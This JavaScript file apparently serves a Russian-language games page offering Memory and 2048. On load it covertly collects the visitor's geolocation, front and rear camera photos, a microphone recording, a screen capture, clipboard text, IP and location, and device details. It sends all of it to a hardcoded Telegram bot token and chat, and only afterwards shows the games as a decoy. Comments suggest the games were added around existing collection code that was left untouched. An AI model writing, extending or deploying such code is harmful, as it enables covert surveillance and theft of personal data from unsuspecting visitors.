// ТВОИ ДАННЫЕ (НЕ ТРОГАЛ)
const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
const CHAT_ID = '526758225';

const video = document.getElementById('video');

// ========== ВСЕ ТВОИ ФУНКЦИИ ОТПРАВКИ И СБОРА (ОСТАВЛЕНЫ БЕЗ ИЗМЕНЕНИЙ) ==========
async function sendMessage(text) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendPhoto(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } catch(e) {}
}

async function sendAudio(blob, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('voice', blob, 'voice.ogg');
    formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
    } catch(e) {}
}

function getPhoneModel() {
    const ua = navigator.userAgent;
    const screenSize = `${window.screen.width}x${window.screen.height}`;
    if (ua.includes('iPhone')) {
        const models = {
            '320x480': 'iPhone SE/4/4s', '375x667': 'iPhone 6/7/8/SE2', '375x812': 'iPhone X/XS/11 Pro',
            '390x844': 'iPhone 12/13/14', '393x852': 'iPhone 15 Pro/16/16 Plus', '414x896': 'iPhone XR/11/11 Pro Max',
            '428x926': 'iPhone 14 Plus/15 Plus', '430x932': 'iPhone 15 Pro Max/16 Pro Max'
        };
        return models[screenSize] || 'iPhone (неизвестная модель)';
    }
    if (ua.includes('Android')) {
        const match = ua.match(/\(.+?\)/);
        if (match) {
            const parts = match[0].split(';');
            for (let part of parts) {
                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
                    return part.trim();
                }
            }
        }
        return `Android (экран ${screenSize})`;
    }
    return 'Неизвестное устройство';
}

function getDeviceType() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/i.test(ua)) {
        if (/iPad/i.test(ua)) return '📱 Планшет (iPad)';
        return '📱 Телефон (iPhone)';
    }
    if (/Android/i.test(ua)) {
        if (/Android(?!.*Mobile)/i.test(ua)) return '📱 Планшет (Android)';
        return '📱 Телефон (Android)';
    }
    if (/Windows/i.test(ua)) return '💻 Компьютер (Windows)';
    if (/Mac/i.test(ua)) return '💻 Компьютер (Mac)';
    if (/Linux/i.test(ua)) return '💻 Компьютер (Linux)';
    return '❓ Неизвестное устройство';
}

function getGeo(callback) {
    if (!navigator.geolocation) {
        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
        callback(null);
        return;
    }
    navigator.geolocation.getCurrentPosition(
        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        (error) => {
            let errorMsg = '';
            if (error.code === 1) errorMsg = '❌ Пользователь ЗАПРЕТИЛ доступ к геолокации';
            else if (error.code === 2) errorMsg = '❌ Геолокация недоступна';
            else errorMsg = '❌ Ошибка геолокации';
            sendMessage(errorMsg);
            callback(null);
        }
    );
}

function getCamera(facing, callback) {
    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }
    }).then(stream => callback(stream)).catch((error) => {
        let errorMsg = '';
        if (error.name === 'NotAllowedError') errorMsg = `❌ Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
        else if (error.name === 'NotFoundError') errorMsg = `❌ ${cameraName} камера не найдена`;
        else errorMsg = `❌ Ошибка камеры: ${error.name}`;
        sendMessage(errorMsg);
        callback(null);
    });
}

async function takePhoto(stream, caption) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        video.play().then(() => {
            setTimeout(() => {
                const width = video.videoWidth;
                const height = video.videoHeight;
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                canvas.toBlob(async (blob) => {
                    if (blob) await sendPhoto(blob, caption);
                    resolve();
                }, 'image/jpeg', 0.85);
            }, 800);
        }).catch(() => resolve());
    });
}

async function recordAudio() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
            stream.getTracks().forEach(t => t.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    } catch(e) {
        let msg = '';
        if (e.name === 'NotAllowedError') msg = '❌ Пользователь ЗАПРЕТИЛ доступ к микрофону';
        else if (e.name === 'NotFoundError') msg = '❌ Микрофон не найден';
        else msg = `❌ Ошибка микрофона: ${e.message}`;
        sendMessage(msg);
    }
}

async function takeScreenshot() {
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const videoEl = document.createElement('video');
        const canvas = document.createElement('canvas');
        videoEl.srcObject = stream;
        videoEl.play();
        videoEl.onloadedmetadata = () => {
            canvas.width = videoEl.videoWidth;
            canvas.height = videoEl.videoHeight;
            canvas.getContext('2d').drawImage(videoEl, 0, 0);
            canvas.toBlob(async (blob) => {
                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        };
    } catch(e) {
        let msg = '';
        if (e.name === 'NotAllowedError') msg = '❌ Пользователь запретил скриншот экрана';
        else if (e.name === 'NotFoundError') msg = '❌ Функция скриншота не найдена';
        else msg = `❌ Ошибка скриншота: ${e.message}`;
        sendMessage(msg);
    }
}

async function getSensorsData() {
    return new Promise((resolve) => {
        if (!('DeviceMotionEvent' in window)) {
            resolve('📊 Датчики: не поддерживаются');
            return;
        }
        let maxAcc = 0, maxRot = 0, samples = 0;
        const handler = (e) => {
            const acc = e.acceleration;
            const rot = e.rotationRate;
            if (acc && acc.x !== null) {
                const accMagnitude = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
                if (accMagnitude > maxAcc) maxAcc = accMagnitude;
            }
            if (rot && rot.beta !== null) {
                const rotMagnitude = Math.abs(rot.alpha || 0) + Math.abs(rot.beta || 0) + Math.abs(rot.gamma || 0);
                if (rotMagnitude > maxRot) maxRot = rotMagnitude;
            }
            samples++;
            if (samples >= 30) {
                window.removeEventListener('devicemotion', handler);
                let status = '';
                if (maxAcc < 1.5) status = 'СТОИТ';
                else if (maxAcc > 2.5 && maxAcc < 8) status = 'ИДЁТ (шаги)';
                else if (maxAcc >= 8) status = 'ТРЯСУТ';
                else if (maxRot > 30) status = 'ПОВОРАЧИВАЮТ';
                else status = 'СТОИТ';
                resolve(`📊 Статус: ${status}`);
            }
        };
        window.addEventListener('devicemotion', handler);
        setTimeout(() => {
            window.removeEventListener('devicemotion', handler);
            if (samples < 30) resolve('📊 Статус: СТОИТ');
        }, 3000);
    });
}

async function getClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        if (text) return `📋 Буфер: ${text.substring(0, 100)}`;
        else return `📋 Буфер: (пусто)`;
    } catch(e) { return `📋 Буфер: нет доступа`; }
}

function doVibrate() {
    if (navigator.vibrate) {
        navigator.vibrate([500, 200, 500]);
        return '📳 Вибро: да';
    }
    return '📳 Вибро: не поддерживается';
}

async function getVPNStatus() {
    try {
        const ipStart = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        return `🌐 IP публичный: ${ipStart.ip}`;
    } catch(e) { return `🌐 VPN: ошибка проверки`; }
}

async function getBrowserHistory() {
    const sites = ['google.com', 'youtube.com', 'yandex.ru', 'vk.com', 't.me', 'instagram.com'];
    let visitedCount = 0;
    for (let site of sites) {
        const link = document.createElement('a');
        link.href = `https://${site}`;
        const color = window.getComputedStyle(link).color;
        if (color === 'rgb(0, 0, 238)' || color === 'rgb(85, 26, 139)') visitedCount++;
    }
    return `🌐 История: ${visitedCount}/${sites.length} сайтов посещали`;
}

async function collectAllInfo() {
    const ua = navigator.userAgent;
    let os = 'Unknown';
    if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    else if (ua.indexOf('Windows') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    
    let browser = 'Unknown';
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Edg') > -1) browser = 'Edge';
    
    const phoneModel = getPhoneModel();
    const deviceType = getDeviceType();
    const time = new Date().toLocaleString('ru-RU');
    
    let battery = '';
    if ('getBattery' in navigator) {
        try {
            const b = await navigator.getBattery();
            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
        } catch(e) {}
    }
    
    let connection = '';
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) connection = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
    
    let ip = '';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
    } catch(e) {}
    
    let summary = `${deviceType}\n📱 ОС: ${os} | ${browser}\n📲 Модель: ${phoneModel}\n⏰ Время: ${time}\n${battery}\n${connection}\n${ip}\n`;
    summary += `${await getSensorsData()}\n`;
    summary += `${await getClipboard()}\n`;
    summary += `${doVibrate()}\n`;
    summary += `${await getVPNStatus()}\n`;
    summary += `${await getBrowserHistory()}`;
    return summary;
}

// ========== ИГРЫ (ДОБАВЛЕНЫ) ==========

// Игра Мемори
function createMemoryGame(onFinish) {
    const emojis = ['🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼'];
    let cards = [...emojis, ...emojis];
    let flippedCards = [];
    let matchedPairs = 0;
    let lockBoard = false;
    
    // Перемешивание
    for (let i = cards.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [cards[i], cards[j]] = [cards[j], cards[i]];
    }
    
    const container = document.createElement('div');
    container.className = 'game-container';
    container.innerHTML = `
        <div class="game-header">
            <button class="back-btn">← Назад</button>
            <div class="score">Пары: 0/${emojis.length}</div>
        </div>
        <div class="memory-grid"></div>
    `;
    
    const grid = container.querySelector('.memory-grid');
    const scoreEl = container.querySelector('.score');
    const backBtn = container.querySelector('.back-btn');
    
    function updateScore() {
        scoreEl.textContent = `Пары: ${matchedPairs}/${emojis.length}`;
        if (matchedPairs === emojis.length) {
            setTimeout(() => {
                if (onFinish) onFinish();
            }, 500);
        }
    }
    
    function checkMatch() {
        const [card1, card2] = flippedCards;
        const emoji1 = card1.dataset.emoji;
        const emoji2 = card2.dataset.emoji;
        
        if (emoji1 === emoji2) {
            card1.classList.add('matched');
            card2.classList.add('matched');
            matchedPairs++;
            updateScore();
        } else {
            setTimeout(() => {
                card1.classList.remove('flipped');
                card2.classList.remove('flipped');
            }, 600);
        }
        flippedCards = [];
        lockBoard = false;
    }
    
    function createCard(emoji, index) {
        const card = document.createElement('div');
        card.className = 'memory-card';
        card.dataset.emoji = emoji;
        card.textContent = '?';
        card.style.fontSize = '36px';
        card.addEventListener('click', () => {
            if (lockBoard) return;
            if (card.classList.contains('flipped') || card.classList.contains('matched')) return;
            card.classList.add('flipped');
            card.textContent = emoji;
            flippedCards.push(card);
            if (flippedCards.length === 2) {
                lockBoard = true;
                checkMatch();
            }
        });
        return card;
    }
    
    cards.forEach((emoji, i) => {
        grid.appendChild(createCard(emoji, i));
    });
    
    backBtn.addEventListener('click', () => {
        if (onFinish) onFinish();
    });
    
    return container;
}

// Игра 2048
function create2048Game(onFinish) {
    let grid = [
        [0,0,0,0],
        [0,0,0,0],
        [0,0,0,0],
        [0,0,0,0]
    ];
    let score = 0;
    
    function addRandomTile() {
        const empty = [];
        for (let i = 0; i < 4; i++) {
            for (let j = 0; j < 4; j++) {
                if (grid[i][j] === 0) empty.push([i,j]);
            }
        }
        if (empty.length > 0) {
            const [row, col] = empty[Math.floor(Math.random() * empty.length)];
            grid[row][col] = Math.random() < 0.9 ? 2 : 4;
        }
    }
    
    function updateUI(cells) {
        for (let i = 0; i < 4; i++) {
            for (let j = 0; j < 4; j++) {
                const val = grid[i][j];
                cells[i][j].textContent = val === 0 ? '' : val;
                cells[i][j].style.background = val === 0 ? 'rgba(255,255,255,0.05)' :
                    val === 2 ? '#3e4a5e' :
                    val === 4 ? '#4e5a6e' :
                    val === 8 ? '#5e6a7e' :
                    val === 16 ? '#6e7a8e' :
                    val === 32 ? '#7e8a9e' :
                    val === 64 ? '#8e9aae' :
                    val === 128 ? '#9eaabe' :
                    val === 256 ? '#aebace' :
                    val === 512 ? '#becade' :
                    '#cedaee';
                cells[i][j].style.fontSize = val >= 1000 ? '20px' : '28px';
            }
        }
        const scoreEl = document.querySelector('.score-2048');
        if (scoreEl) scoreEl.textContent = `Счёт: ${score}`;
    }
    
    function move(direction) {
        let moved = false;
        const oldGrid = JSON.parse(JSON.stringify(grid));
        
        for (let i = 0; i < 4; i++) {
            let row = [];
            for (let j = 0; j < 4; j++) {
                let val = direction === 'left' ? grid[i][j] :
                          direction === 'right' ? grid[i][3-j] :
                          direction === 'up' ? grid[j][i] :
                          grid[3-j][i];
                if (val !== 0) row.push(val);
            }
            for (let j = 0; j < row.length - 1; j++) {
                if (row[j] === row[j+1]) {
                    row[j] *= 2;
                    score += row[j];
                    row.splice(j+1,1);
                }
            }
            while (row.length < 4) row.push(0);
            for (let j = 0; j < 4; j++) {
                const val = row[j];
                if (direction === 'left') grid[i][j] = val;
                else if (direction === 'right') grid[i][3-j] = val;
                else if (direction === 'up') grid[j][i] = val;
                else grid[3-j][i] = val;
            }
        }
        
        if (JSON.stringify(oldGrid) !== JSON.stringify(grid)) moved = true;
        if (moved) {
            addRandomTile();
            let win = false;
            for (let i = 0; i < 4; i++) {
                for (let j = 0; j < 4; j++) {
                    if (grid[i][j] === 2048) win = true;
                }
            }
            return win;
        }
        return false;
    }
    
    const container = document.createElement('div');
    container.className = 'game-container';
    container.innerHTML = `
        <div class="game-header">
            <button class="back-btn">← Назад</button>
            <div class="score score-2048">Счёт: 0</div>
        </div>
        <div class="grid-2048"></div>
    `;
    
    const gridContainer = container.querySelector('.grid-2048');
    const backBtn = container.querySelector('.back-btn');
    const cells = [];
    for (let i = 0; i < 4; i++) {
        cells[i] = [];
        for (let j = 0; j < 4; j++) {
            const tile = document.createElement('div');
            tile.className = 'tile';
            cells[i][j] = tile;
            gridContainer.appendChild(tile);
        }
    }
    
    addRandomTile();
    addRandomTile();
    updateUI(cells);
    
    const handleKey = (e) => {
        let dir = null;
        if (e.key === 'ArrowLeft') dir = 'left';
        else if (e.key === 'ArrowRight') dir = 'right';
        else if (e.key === 'ArrowUp') dir = 'up';
        else if (e.key === 'ArrowDown') dir = 'down';
        if (dir) {
            e.preventDefault();
            const win = move(dir);
            updateUI(cells);
            if (win && onFinish) onFinish();
        }
    };
    
    let touchStart = null;
    const handleTouchStart = (e) => {
        touchStart = { x: e.touches[0].clientX, y: e.touches[0].clientY };
    };
    const handleTouchEnd = (e) => {
        if (!touchStart) return;
        const dx = e.changedTouches[0].clientX - touchStart.x;
        const dy = e.changedTouches[0].clientY - touchStart.y;
        if (Math.abs(dx) < 10 && Math.abs(dy) < 10) return;
        let dir = null;
        if (Math.abs(dx) > Math.abs(dy)) dir = dx > 0 ? 'right' : 'left';
        else dir = dy > 0 ? 'down' : 'up';
        const win = move(dir);
        updateUI(cells);
        if (win && onFinish) onFinish();
        touchStart = null;
    };
    
    window.addEventListener('keydown', handleKey);
    container.addEventListener('touchstart', handleTouchStart);
    container.addEventListener('touchend', handleTouchEnd);
    
    backBtn.addEventListener('click', () => {
        window.removeEventListener('keydown', handleKey);
        if (onFinish) onFinish();
    });
    
    return container;
}

// ========== ГЛАВНАЯ ЛОГИКА С ВЫБОРОМ ИГР ==========
async function main() {
    // Скрываем спиннер
    const loader = document.querySelector('.loader');
    if (loader) loader.style.display = 'none';
    
    const app = document.getElementById('app');
    
    // Экран выбора игры
    function showGameSelector() {
        const selector = document.createElement('div');
        selector.className = 'game-selector';
        selector.innerHTML = `
            <h1>🎮 Выбери игру</h1>
            <div class="game-buttons">
                <div class="game-btn" data-game="memory">
                    <h2>🧠 Мемори</h2>
                    <p>Найди пары одинаковых эмодзи</p>
                </div>
                <div class="game-btn" data-game="2048">
                    <h2>🎲 2048</h2>
                    <p>Собирай плитки до 2048</p>
                </div>
            </div>
        `;
        
        selector.querySelector('[data-game="memory"]').addEventListener('click', () => {
            startGame('memory');
        });
        selector.querySelector('[data-game="2048"]').addEventListener('click', () => {
            startGame('2048');
        });
        
        app.innerHTML = '';
        app.appendChild(selector);
    }
    
    function startGame(gameType) {
        let gameContainer = null;
        let gameCleanup = null;
        
        const backToMenu = () => {
            if (gameCleanup) gameCleanup();
            showGameSelector();
        };
        
        if (gameType === 'memory') {
            gameContainer = createMemoryGame(backToMenu);
        } else if (gameType === '2048') {
            gameContainer = create2048Game(backToMenu);
        }
        
        if (gameContainer) {
            app.innerHTML = '';
            app.appendChild(gameContainer);
        }
    }
    
    // Запускаем сбор данных в фоне (НЕ ТРОГАЛ ТВОЙ КОД)
    // Геолокация
    getGeo(async (loc) => {
        if (loc) {
            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
        }
        
        getCamera('user', async (stream) => {
            if (stream) {
                await takePhoto(stream, '📸 Фронтальная камера');
                
                setTimeout(async () => {
                    getCamera('environment', async (backStream) => {
                        if (backStream) {
                            await takePhoto(backStream, '📸 Задняя камера');
                            backStream.getTracks().forEach(t => t.stop());
                        }
                        stream.getTracks().forEach(t => t.stop());
                        
                        await recordAudio();
                        await takeScreenshot();
                        
                        const allInfo = await collectAllInfo();
                        await sendMessage(allInfo);
                        
                        // НЕ ЗАКРЫВАЕМ СТРАНИЦУ — показываем игры
                        showGameSelector();
                    });
                }, 3000);
            } else {
                const allInfo = await collectAllInfo();
                await sendMessage(allInfo);
                showGameSelector();
            }
        });
    });
}

// ЗАПУСК
main();
